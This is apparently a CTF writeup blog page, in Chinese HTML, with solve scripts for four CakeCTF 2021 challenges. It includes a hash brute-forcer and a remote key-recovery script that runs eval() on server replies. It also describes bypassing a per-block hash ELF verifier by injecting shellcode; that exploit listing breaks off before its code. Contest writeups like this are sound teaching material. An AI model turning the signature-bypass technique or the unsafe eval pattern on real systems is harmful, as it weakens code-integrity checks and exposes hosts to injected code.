@@ -1,0 +1,346 @@
+<!doctype html><html dir=ltr lang=en data-theme=light><head><title>artis24106
+|
+2021 CakeCTF - Writeup</title><meta charset=utf-8><meta name=generator content="Hugo 0.68.3"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=description content="真白な夢 羽ばたかせよう"><link rel=stylesheet href=/blog/css/main.min.f08dfd6292604273495f670c5af67081690e166c26708b1dda2d9147b11b7fd9.css integrity="sha256-8I39YpJgQnNJX2cMWvZwgWkOFmwmcIsd2i2RR7Ebf9k=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/blog/css/markupHighlight.min.cc84ed683057cc175ddfa738ea6ba2d5c882b95cb64f50bf9be918cb3791887b.css integrity="sha256-zITtaDBXzBdd36c46mui1ciCuVy2T1C/m+kYyzeRiHs=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/blog/css/custom.min.dc0516b2bdc13f85ecd94c7add3c94e295d8ebb3e40691a9c2ca66825c80453c.css integrity="sha256-3AUWsr3BP4Xs2Ux63TyU4pXY67PkBpGpwspmglyARTw=" crossorigin=anonymous media=screen><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin=anonymous><link rel="shortcut icon" href=/blogfavicon.ico type=image/x-icon><link rel=apple-touch-icon sizes=180x180 href=/blogapple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/blogfavicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/blogfavicon-16x16.png><link rel=canonical href=/blog/posts/2021-cakectf/><script type=text/javascript src=/blog/js/anatole-header.min.413f798d8aa82610bef17a5ca1d7e962ec185be395f1aeb3f45d1891af568b65.js integrity="sha256-QT95jYqoJhC+8XpcodfpYuwYW+OV8a6z9F0Yka9Wi2U=" crossorigin=anonymous></script><meta name=twitter:card content="summary"><meta name=twitter:title content="2021 CakeCTF - Writeup"><meta name=twitter:description content="題目：nostrings, Hash-browns, rflag, ALDRYA"><script async src="https://www.googletagmanager.com/gtag/js?id=G-0K535799NY"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}
+gtag('js',new Date());gtag('config','G-0K535799NY');</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","articleSection":"posts","name":"2021 CakeCTF - Writeup","headline":"2021 CakeCTF - Writeup","alternativeHeadline":"","description":"
+      
+        \x3cp\x3e題目：\x3ccode\x3enostrings\x3c\/code\x3e, \x3ccode\x3eHash-browns\x3c\/code\x3e, \x3ccode\x3erflag\x3c\/code\x3e, \x3ccode\x3eALDRYA\x3c\/code\x3e\x3c\/p\x3e
+
+
+      
+
+
+    ","inLanguage":"en","isFamilyFriendly":"true","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/artis24106.github.io\/blog\/posts\/2021-cakectf\/"},"author":{"@type":"Person","name":"artis24106"},"creator":{"@type":"Person","name":"artis24106"},"accountablePerson":{"@type":"Person","name":"artis24106"},"copyrightHolder":{"@type":"Person","name":"artis24106"},"copyrightYear":"2021","dateCreated":"2021-08-29T08:16:07.00Z","datePublished":"2021-08-29T08:16:07.00Z","dateModified":"2021-08-29T08:16:07.00Z","publisher":{"@type":"Organization","name":"artis24106","url":"https://artis24106.github.io/blog","logo":{"@type":"ImageObject","url":"https:\/\/artis24106.github.io\/blogfavicon-32x32.png","width":"32","height":"32"}},"image":[],"url":"https:\/\/artis24106.github.io\/blog\/posts\/2021-cakectf\/","wordCount":"887","genre":["CTF"],"keywords":["CTF","CakeCTF","Reverse","Misc"]}</script></head><body><header><div class="page-top
+."><a role=button class=navbar-burger data-target=navMenu aria-label=menu aria-expanded=false><span aria-hidden=true></span><span aria-hidden=true></span><span aria-hidden=true></span></a><nav><ul class=nav__list id=navMenu><div class=nav__links><li><a href=/blog/posts/>Posts</a></li><li><a href=/blog/tags/>Tags</a></li><li><a href=/blog/categories/>Categories</a></li></div><li></li></ul></nav></div></header><div class=wrapper><aside><div class="sidebar
+."><div class=sidebar__content><div class=logo-title><div class=title><img src="https://avatars.githubusercontent.com/u/32833063?v=4" alt="profile picture"><h3><a href=/blog>artis24106's blog</a></h3><div class=description><p>真白な夢 羽ばたかせよう</p></div></div></div><ul class=social-links><li><a href=https://github.com/Artis24106 rel=me aria-label=Github><i class="fab fa-github fa-2x" aria-hidden=true></i></a></li></ul></div><footer class="footer footer--sidebar"><div class=by_farbox><ul class=footer__list><li class=footer__item>&copy;
+artis24106
+2021</li></ul></div></footer><script type=text/javascript src=/blog/js/medium-zoom.min.bdc7b23aff63497a79433b3920b03e2473399d90ad4c2d87cf7c08d33d61966f.js integrity="sha256-vceyOv9jSXp5Qzs5ILA+JHM5nZCtTC2Hz3wI0z1hlm8=" crossorigin=anonymous></script></div></aside><main><div class=autopagerize_page_element><div class=content><div class="post
+."><div class=post-content><div class=post-title><h1>2021 CakeCTF - Writeup</h1></div><p>題目：<code>nostrings</code>, <code>Hash-browns</code>, <code>rflag</code>, <code>ALDRYA</code></p><h2 id=scorenctfu---5th>Score：NCtfU - 5th</h2><p><img src=img/3.png alt></p><h2 id=nostrings>nostrings</h2><h3 id=challenge-info>Challenge Info</h3><blockquote><p>CTF / rev / warmup &ndash;> strings</p></blockquote><p><code>nostrings</code></p><h3 id=solution>Solution</h3><p>用假 flag 組成真 flag 的題目：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=n>printable</span>
+
+<span class=n>key</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./0x4020.bin&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+
+<span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>58</span><span class=p>):</span>
+    <span class=k>for</span> <span class=n>el</span> <span class=ow>in</span> <span class=n>printable</span><span class=p>:</span>
+        <span class=k>if</span> <span class=n>key</span><span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=n>el</span><span class=p>)</span> <span class=o>*</span> <span class=mi>127</span> <span class=o>+</span> <span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=nb>ord</span><span class=p>(</span><span class=n>el</span><span class=p>):</span>
+            <span class=n>flag</span> <span class=o>+=</span> <span class=n>el</span>
+            <span class=k>break</span>
+<span class=k>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
+</code></pre></td></tr></table></div></div><h3 id=flag>Flag</h3><p><code>CakeCTF{th3_b357_p14c3_70_hid3_4_f14g_i5_in_4_f14g_f0r357}</code></p><hr><h2 id=hash-browns>Hash-browns</h2><h3 id=challenge-info-1>Challenge Info</h3><blockquote><p>Would you mind making the finest hash browns, chef?</p></blockquote><p><code>hash_browns</code></p><h3 id=solution-1>Solution</h3><p>程式流程簡單來說：</p><ul><li>每次取輸入的 2 bytes 分別計算 md5, sha256</li><li>要跟特定的 hash 一樣</li></ul><p>把 hash 動態抓出來爆破就可以了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>gdb</span>
+<span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=n>printable</span>
+<span class=kn>import</span> <span class=nn>hashlib</span>
+
+<span class=n>sha256_idx</span> <span class=o>=</span> <span class=p>[]</span>
+
+<span class=s1>&#39;&#39;&#39;get_sha256_idx&#39;&#39;&#39;</span>
+<span class=n>cmd</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>execute</span>
+
+<span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;gef config context.enable 0&#39;</span><span class=p>)</span>
+<span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;file hash_browns&#39;</span><span class=p>)</span>
+<span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;b *main+0x2b0&#39;</span><span class=p>)</span>
+<span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;b *main+0x2fa&#39;</span><span class=p>)</span>
+<span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;i b&#39;</span><span class=p>)</span>
+<span class=n>cmd</span><span class=p>(</span><span class=n>f</span><span class=s1>&#39;r {&#34;a&#34; * 37 * 2}&#39;</span><span class=p>)</span>
+
+<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>37</span><span class=p>):</span>
+    <span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;flags +ZERO&#39;</span><span class=p>)</span>
+    <span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;c&#39;</span><span class=p>)</span>
+    <span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;flags +ZERO&#39;</span><span class=p>)</span>
+    <span class=n>rbp</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>parse_and_eval</span><span class=p>(</span><span class=s2>&#34;$rbp - 0x3b4&#34;</span><span class=p>)</span>
+    <span class=n>recv</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>selected_inferior</span><span class=p>()</span><span class=o>.</span><span class=n>read_memory</span><span class=p>(</span><span class=n>rbp</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>tobytes</span><span class=p>()</span>
+    <span class=n>sha256_idx</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>recv</span><span class=p>,</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;little&#39;</span><span class=p>))</span>
+    <span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;c&#39;</span><span class=p>)</span>
+
+
+<span class=k>def</span> <span class=nf>md5</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+    <span class=n>m</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>()</span>
+    <span class=n>m</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+    <span class=k>return</span> <span class=n>m</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()[:</span><span class=mi>10</span><span class=p>]</span>
+
+
+<span class=k>def</span> <span class=nf>sha256</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+    <span class=n>m</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>()</span>
+    <span class=n>m</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+    <span class=k>return</span> <span class=n>m</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()[:</span><span class=mi>10</span><span class=p>]</span>
+
+
+<span class=k>def</span> <span class=nf>hash_lookup</span><span class=p>(</span><span class=n>hash_func</span><span class=p>,</span> <span class=n>hash_lsit</span><span class=p>):</span>
+    <span class=nb>hash</span> <span class=o>=</span> <span class=n>hash_func</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
+    <span class=k>while</span> <span class=nb>hash</span> <span class=ow>in</span> <span class=n>hash_lsit</span><span class=p>:</span>
+        <span class=n>idx</span> <span class=o>=</span> <span class=n>hash_lsit</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=nb>hash</span><span class=p>)</span>
+        <span class=n>off</span> <span class=o>=</span> <span class=n>hash_func</span> <span class=o>==</span> <span class=n>sha256</span>
+        <span class=n>hash_lsit</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=bp>None</span>
+        <span class=n>flag_list</span><span class=p>[</span><span class=n>idx</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span> <span class=o>|</span> <span class=n>off</span><span class=p>]</span> <span class=o>=</span> <span class=n>p</span>
+
+
+<span class=n>md5_list</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;0d61f8370c&#39;</span><span class=p>,</span> <span class=s1>&#39;8ce4b16b22&#39;</span><span class=p>,</span> <span class=s1>&#39;0d61f8370c&#39;</span><span class=p>,</span> <span class=s1>&#39;8006189430&#39;</span><span class=p>,</span> <span class=s1>&#39;84c4047341&#39;</span><span class=p>,</span> <span class=s1>&#39;d956797521&#39;</span><span class=p>,</span> <span class=s1>&#39;9371d7a2e3&#39;</span><span class=p>,</span> <span class=s1>&#39;43ec3e5dee&#39;</span><span class=p>,</span> <span class=s1>&#39;336d5ebc54&#39;</span><span class=p>,</span> <span class=s1>&#39;336d5ebc54&#39;</span><span class=p>,</span> <span class=s1>&#39;4c761f170e&#39;</span><span class=p>,</span> <span class=s1>&#39;84c4047341&#39;</span><span class=p>,</span> <span class=s1>&#39;b14a7b8059&#39;</span><span class=p>,</span> <span class=s1>&#39;9371d7a2e3&#39;</span><span class=p>,</span> <span class=s1>&#39;4c761f170e&#39;</span><span class=p>,</span> <span class=s1>&#39;44c29edb10&#39;</span><span class=p>,</span> <span class=s1>&#39;b9ece18c95&#39;</span><span class=p>,</span> <span class=s1>&#39;b9ece18c95&#39;</span><span class=p>,</span>
+            <span class=s1>&#39;f186217753&#39;</span><span class=p>,</span> <span class=s1>&#39;f186217753&#39;</span><span class=p>,</span> <span class=s1>&#39;4c761f170e&#39;</span><span class=p>,</span> <span class=s1>&#39;84c4047341&#39;</span><span class=p>,</span> <span class=s1>&#39;518ed29525&#39;</span><span class=p>,</span> <span class=s1>&#39;9371d7a2e3&#39;</span><span class=p>,</span> <span class=s1>&#39;26b17225b6&#39;</span><span class=p>,</span> <span class=s1>&#39;336d5ebc54&#39;</span><span class=p>,</span> <span class=s1>&#39;336d5ebc54&#39;</span><span class=p>,</span> <span class=s1>&#39;3389dae361&#39;</span><span class=p>,</span> <span class=s1>&#39;84c4047341&#39;</span><span class=p>,</span> <span class=s1>&#39;d956797521&#39;</span><span class=p>,</span> <span class=s1>&#39;9371d7a2e3&#39;</span><span class=p>,</span> <span class=s1>&#39;a87ff679a2&#39;</span><span class=p>,</span> <span class=s1>&#39;1679091c5a&#39;</span><span class=p>,</span> <span class=s1>&#39;c4ca4238a0&#39;</span><span class=p>,</span> <span class=s1>&#39;8f14e45fce&#39;</span><span class=p>,</span> <span class=s1>&#39;c9f0f895fb&#39;</span><span class=p>,</span> <span class=s1>&#39;a87ff679a2&#39;</span><span class=p>]</span>
+<span class=n>sha256_list</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;ca978112ca&#39;</span><span class=p>,</span> <span class=s1>&#39;3f79bb7b43&#39;</span><span class=p>,</span> <span class=s1>&#39;7ace431cb6&#39;</span><span class=p>,</span> <span class=s1>&#39;d2e2adf717&#39;</span><span class=p>,</span> <span class=s1>&#39;74cd9ef9c7&#39;</span><span class=p>,</span> <span class=s1>&#39;c4694f2e93&#39;</span><span class=p>,</span> <span class=s1>&#39;2c624232cd&#39;</span><span class=p>,</span> <span class=s1>&#39;559aead082&#39;</span><span class=p>,</span> <span class=s1>&#39;7ace431cb6&#39;</span><span class=p>,</span> <span class=s1>&#39;d4735e3a26&#39;</span><span class=p>,</span> <span class=s1>&#39;ba5ec51d07&#39;</span><span class=p>,</span> <span class=s1>&#39;684888c0eb&#39;</span><span class=p>,</span> <span class=s1>&#39;7902699be4&#39;</span><span class=p>,</span> <span class=s1>&#39;7ace431cb6&#39;</span><span class=p>,</span> <span class=s1>&#39;148de9c5a7&#39;</span><span class=p>,</span> <span class=s1>&#39;74cd9ef9c7&#39;</span><span class=p>,</span> <span class=s1>&#39;32ebb1abcc&#39;</span><span class=p>,</span> <span class=s1>&#39;32ebb1abcc&#39;</span><span class=p>,</span>
+               <span class=s1>&#39;3e23e81600&#39;</span><span class=p>,</span> <span class=s1>&#39;e632b7095b&#39;</span><span class=p>,</span> <span class=s1>&#39;7ace431cb6&#39;</span><span class=p>,</span> <span class=s1>&#39;d2e2adf717&#39;</span><span class=p>,</span> <span class=s1>&#39;ef2d127de3&#39;</span><span class=p>,</span> <span class=s1>&#39;3973e022e9&#39;</span><span class=p>,</span> <span class=s1>&#39;c4694f2e93&#39;</span><span class=p>,</span> <span class=s1>&#39;021fb596db&#39;</span><span class=p>,</span> <span class=s1>&#39;7ace431cb6&#39;</span><span class=p>,</span> <span class=s1>&#39;380918b946&#39;</span><span class=p>,</span> <span class=s1>&#39;74cd9ef9c7&#39;</span><span class=p>,</span> <span class=s1>&#39;a318c24216&#39;</span><span class=p>,</span> <span class=s1>&#39;74cd9ef9c7&#39;</span><span class=p>,</span> <span class=s1>&#39;380918b946&#39;</span><span class=p>,</span> <span class=s1>&#39;74cd9ef9c7&#39;</span><span class=p>,</span> <span class=s1>&#39;ba5ec51d07&#39;</span><span class=p>,</span> <span class=s1>&#39;380918b946&#39;</span><span class=p>,</span> <span class=s1>&#39;c4694f2e93&#39;</span><span class=p>,</span> <span class=s1>&#39;d10b36aa74&#39;</span><span class=p>]</span>
+<span class=n>flag_list</span> <span class=o>=</span> <span class=p>[</span><span class=bp>None</span><span class=p>]</span> <span class=o>*</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>md5_list</span><span class=p>)</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>sha256_list</span><span class=p>))</span>
+
+<span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>printable</span><span class=p>:</span>
+    <span class=n>hash_lookup</span><span class=p>(</span><span class=n>md5</span><span class=p>,</span> <span class=n>md5_list</span><span class=p>)</span>
+    <span class=n>hash_lookup</span><span class=p>(</span><span class=n>sha256</span><span class=p>,</span> <span class=n>sha256_list</span><span class=p>)</span>
+
+
+<span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>v</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>sha256_idx</span><span class=p>):</span>
+    <span class=k>print</span><span class=p>(</span><span class=n>f</span><span class=s2>&#34;{flag_list[i &lt;&lt; 1]}{flag_list[v &lt;&lt; 1 | 1]}&#34;</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+
+
+<span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;quit&#39;</span><span class=p>)</span>
+</code></pre></td></tr></table></div></div><h3 id=flag-1>Flag</h3><p><code>CakeCTF{(^o^)==(-p-)~~(=_=)~~~POTATOOOO~~~(^@^)++(-_-)**(^o-)_486512778b4}</code></p><hr><h2 id=rflag>rflag</h2><h3 id=challenge-info-2>Challenge Info</h3><blockquote><p>CTFer is good at guessing something, right?</p></blockquote><p><code>rflag</code>, <code>flag.txt</code></p><h3 id=solution-2>Solution</h3><p>RUST 題，目標是猜中一個隨機字串 <code>[0-9a-f]{32}</code>，有 4 次機會可以輸入 regex，會回傳符合條件的 offset</p><p>local 測試可以用 <code>./rflag cakemode</code> 會顯示隨機字串，實際執行如下：</p><p><img src=img/1.png alt></p><p>丟 IDA 稍微標註字串然後手動 mangling 一下程式流程就蠻清楚了，但看半天都找不到漏洞&mldr;</p><hr><p>結果連逆向都不用</p><p>因為拿 <code>0b1xxx</code> 去搜（<code>[89abcdef]</code>）可以知道所有值的最高位是 0 或 1，以此類推每次搜 1 bit，剛好 4 次可以解掉</p><blockquote><p>一天又平安的過去了，感謝隊友 <code>t510599</code>的凱瑞！</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>DEBUG</span> <span class=o>=</span> <span class=bp>False</span>
+
+<span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;WARNING&#39;</span>
+<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./rflag&#39;</span><span class=p>)</span> <span class=k>if</span> <span class=n>DEBUG</span> <span class=k>else</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;misc.cakectf.com&#34;</span><span class=p>,</span> <span class=mi>10023</span><span class=p>)</span>
+<span class=n>hex_digits</span> <span class=o>=</span> <span class=s2>&#34;0123456789abcdef&#34;</span>
+
+
+<span class=k>def</span> <span class=nf>guess</span><span class=p>(</span><span class=n>mask</span><span class=p>):</span>
+    <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;[{}]&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>list</span><span class=p>(</span><span class=nb>filter</span><span class=p>(</span><span class=k>lambda</span> <span class=n>_</span><span class=p>:</span> <span class=nb>int</span><span class=p>(</span><span class=n>_</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask</span><span class=p>,</span> <span class=n>hex_digits</span><span class=p>))))</span>
+    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+    <span class=n>recv</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=bp>True</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+    <span class=k>return</span> <span class=nb>eval</span><span class=p>(</span><span class=n>recv</span><span class=p>)</span>
+
+
+<span class=n>key_list</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>32</span>
+<span class=k>for</span> <span class=n>shift</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>)):</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>guess</span><span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>shift</span><span class=p>):</span>
+        <span class=n>key_list</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>|=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>shift</span><span class=p>)</span>
+
+<span class=n>key</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>list</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=k>lambda</span> <span class=n>_</span><span class=p>:</span> <span class=n>format</span><span class=p>(</span><span class=n>_</span><span class=p>,</span> <span class=s1>&#39;x&#39;</span><span class=p>),</span> <span class=n>key_list</span><span class=p>)))</span>
+<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Okay, what&#39;s the answer?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
+<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;FLAG: &#39;</span><span class=p>)</span>
+<span class=k>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
+<span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</code></pre></td></tr></table></div></div><h3 id=flag-2>Flag</h3><p><code>CakeCTF{n0b0dy_w4nt5_2_r3v3r53_RUST_pr0gr4m}</code></p><blockquote><p>這題是 misc 吧 😿</p></blockquote><hr><h2 id=aldrya>ALDRYA</h2><h3 id=challenge-info-3>Challenge Info</h3><blockquote><p>I&rsquo;m scared of executing a malicious ELF file. That&rsquo;s why I invented this new ELF-verify system named ALDRYA.</p></blockquote><p><code>aldrya</code>, <code>sample.elf</code>, <code>server.py</code>, <code>README.md</code></p><h3 id=solution-3>Solution</h3><p><code>README.md</code> 有清楚的使用方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-md data-lang=md><span class=gh># ALDRYA - CakeCTF 2021
+</span><span class=gh></span>
+<span class=sb>`server.py`</span> is running on the remote server.
+You can upload an ELF file and the server will execute the following command:
+
+ $ ./aldrya &lt;Your ELF&gt; ./sample.aldrya
+
+<span class=sb>`sample.aldrya`</span> is the signature of <span class=sb>`sample.elf`</span>.
+You can test it like this:
+
+ $ ./aldrya ./sample.elf ./sample.aldrya
+
+The flag exists somewhere on the root directory.
+</code></pre></td></tr></table></div></div><p>核心邏輯在 <code>aldrya</code>，會讀入一個檔案然後做檢查：</p><ul><li>檔案開頭要有 ELF magic：<code>'FLE\x7F'</code></li><li>檔案大小限制： <code>[0x41&lt;&lt;8, 0x42&lt;&lt;8)</code> bytes</li><li>每 0x100 bytes 計算 hash，hash 紀錄在 <code>./sample.aldrya</code></li></ul><p>通過檢查之後，直接執行該檔案（<code>execv()</code>）</p><hr><p><code>sample.elf</code> 是個簡單的 <code>puts("Hello, Aldrya!")</code> ELF 執行檔，它能通過檢查，所以這題變簡單很多，直接找一個 block 來改就可以了</p><p>把 shellcode 寫在 <code>_start()</code> 開頭，然後控制該 block 最後 32 bytes 讓 hash 值正確就可以了（能執行 shellcode 就好，後面爛掉無所謂），腳本如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
